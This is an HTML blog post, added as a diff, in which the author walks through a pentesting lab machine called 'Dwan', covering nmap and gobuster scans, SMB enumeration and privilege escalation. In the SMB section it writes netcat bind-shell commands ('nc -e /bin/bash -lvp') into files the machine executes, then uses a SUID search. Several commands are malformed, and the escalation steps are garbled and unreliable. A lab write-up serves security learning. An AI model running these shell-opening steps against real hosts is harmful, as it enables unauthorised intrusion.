@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+
+<!--
+  portfolYOU Jekyll theme by Youssef Raafat
+  Free for personal and commercial use under the MIT license
+  https://github.com/YoussefRaafatNasry/portfolYOU
+-->
+
+<html lang="en" class="h-100">
+
+<head>
+
+  
+  
+  
+
+  
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Dwan Machine(Linux machine)">
+  <meta property="og:description" content="pwn Dwan machine">
+  <meta property="og:image" content="https://media.licdn.com/dms/image/D5603AQFIIwKvjz7ShQ/profile-displayphoto-shrink_800_800/0/1707214943515?e=1716422400&v=beta&t=EqzCPUugImKfPEeIpYp93Fwm9bhA36t9Svat7uXynqM">
+
+  <title>Dwan Machine(Linux machine)</title>
+  <meta name="description" content="pwn Dwan machine">
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">
+
+  <!-- Theme style -->
+  <script src="/assets/js/theme.js"></script>
+
+  <!-- Font Awesome CDN -->
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.15.4/css/all.css">
+
+  <!-- Bootstrap CSS CDN -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">
+
+  <!-- Animate CSS CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/assets/css/style.css">
+
+</head>
+
+
+<body class="h-100 d-flex flex-column">
+
+  <main class="flex-shrink-0 container mt-5">
+    <nav class="navbar navbar-expand-lg navbar-themed">
+
+  <a class="navbar-brand" href="/"><h5><b>Harishankar-K</b></h5></a>
+
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+    <i class="fas fa-1x fa-bars text-themed"></i>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+    <div class="navbar-nav ml-auto"><a class="nav-item nav-link " href="/projects/">Projects</a>
+
+      <a class="nav-item nav-link active" href="/blog/">Blog</a>
+
+      <a class="nav-item nav-link " href="/about/">About</a>
+
+      
+
+      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
+    </div>
+  </div>
+
+</nav>
+    <div class="col-lg-10 mx-auto mt-5 markdown-body">
+  <h1><b>Dwan Machine(Linux machine)</b></h1>
+
+<p class="post-metadata text-muted">
+  14 August 2023 -  
+  <b>2 mins read time</b>
+
+  <br>Tags: 
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#secuirty">
+      <span class="tag badge badge-pill text-primary border border-primary">Secuirty</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#machine">
+      <span class="tag badge badge-pill text-primary border border-primary">Machine</span>
+    </a>
+    
+    <a class="text-decoration-none no-underline" href="/blog/tags#pentesting">
+      <span class="tag badge badge-pill text-primary border border-primary">pentesting</span>
+    </a>
+    </p>
+
+<h1 id="dwan-machine">Dwan Machine</h1>
+<p>Hi all Its an linux based machine , let get into it</p>
+
+<p>First we connet to the Network Using VPN</p>
+
+<h2 id="checking-connection">Checking connection</h2>
+<blockquote>
+  <p>Ping 192.168.222.11</p>
+</blockquote>
+
+<p>The connected scuesfully to the network</p>
+
+<h2 id="enumuration">Enumuration</h2>
+
+<blockquote>
+  <p><strong>nmap -sV -A 192.168.222.11</strong></p>
+</blockquote>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGRUP)
+3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.15-MariaDB-1
+|   Thread ID: 25
+|   Capabilities flags: 63486
+|   Some Capabilities: Support41Auth, FoundRows, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOld, SupportsTransactions, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolNew, InteractiveClient, ODBCClient, IgnoreSigpipes, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsCompression, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: YsX&gt;j~\/sw$?PV?uPrm
+|_  Auth Plugin Name: mysql_native_password
+Service Info: Host: DAWN
+
+Host script results:
+| smb2-time: 
+|   date: 2023-08-09T16:05:31
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.9.5-Debian)
+|   Computer name: dawn
+|   NetBIOS computer name: DAWN\x00
+|   Domain name: dawn
+|   FQDN: dawn.dawn
+|_  System time: 2023-08-09T12:05:32-04:00
+|_clock-skew: mean: 1h20m00s, deviation: 2h18m35s, median: 0s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required 
+</code></pre></div></div>
+
+<p>Weee, <em>http</em> port is running let run <strong><em>gobuster</em></strong></p>
+<blockquote>
+  <p><strong>gobuster  dir -u  http://192.168.222.11/ -w /home/harishankar/wordlist/ .txt</strong></p>
+</blockquote>
+
+<p><strong>/logs/</strong>  directory is available 
+let look into it</p>
+
+<p><img src="/assets/img/Dwan/Screenshot%20from%202023-08-09%2022-08-14.jpg" alt="Go busterscan" /></p>
+
+<p><img src="/assets/img/Dwan/Screenshot%20from%202023-08-09%2022-09-19.jpg" alt="Logs" />
+    Log file exposed</p>
+
+<p>In that we can see that a file has excution permision <strong>web-Control</strong>  and <strong>product-Control</strong> with so let see on other side smbclient 
+Doing more enumeration</p>
+
+<p><strong>**Enum4Linux</strong>**<br />
+It Finds that smb runs with shared <strong>ITDEPT</strong> work Grp 
+let connet through smbclient</p>
+<blockquote>
+  <p>smbclient //192.168.222.11/ITDEPT</p>
+</blockquote>
+
+<p><img src="/assets/img/Dwan/Screenshot%20from%202023-08-09%2022-12-56.png" alt="smbclient" /></p>
+
+<h2 id="intial-access">Intial Access</h2>
+<p>um empty , we know that product-control and web-control file with execution</p>
+
+<p>let add file into this</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> echo "nc-e /bin/bash/-lvp 1234&amp;" &gt; product-control
+
+ echo "nc-e /bin/bash/ -lvp 1235&amp;" &gt; web-control
+</code></pre></div></div>
+
+<p>Puting the file into the machine now we essatblish the connetion</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+NC 192.168.222.11 1234 
+
+</code></pre></div></div>
+<h2 id="privilege-escalation">privilege escalation</h2>
+
+<p>SUID — It will provide special type of file permissions given to file. So If I’m an attacker once I got reverse first thing I will check SUID related files.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / -perm -u=s -type f 2&gt;/dev/null 
+ 
+$whoami
+
+$/usr/bin/zsh
+ 
+$whoami
+/root
+/dawn
+
+$cd /root
+$cat flag.txt 
+
+</code></pre></div></div>
+
+
+
+
+</div>
+  </main>
+  <footer class="mt-auto py-3 text-center">
+
+  <small class="text-muted mb-2">
+    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
+    by <strong>Harishankar-K</strong>
+  </small>
+
+  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:harishankar.amk@gmail.com"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#db4437'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fas fa-envelope fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.github.com/harihs0x"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#333333'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-github fa-1x"></i>
+    </a><a class="social mx-1"  href="https://www.linkedin.com/in/harishankark2"
+       style="color: #6c757d"
+       onMouseOver="this.style.color='#007bb5'"
+       onMouseOut="this.style.color='#6c757d'">
+      <i class="fab fa-linkedin-in fa-1x"></i>
+    </a>
+
+</div>
+
+ 
+
+</footer>
+
+  
+  <!-- GitHub Buttons -->
+<script async defer src="https://buttons.github.io/buttons.js"></script>
+
+<!-- jQuery CDN -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<!-- Popper.js CDN -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+
+<!-- Bootstrap JS CDN -->
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+<!-- wow.js CDN & Activation -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
+<script> new WOW().init(); </script>
+
+<!-- Initialize all tooltips -->
+<script>
+$(function () {
+    $('[data-toggle="tooltip"]').tooltip()
+})
+</script>
+</body>
+
+</html>
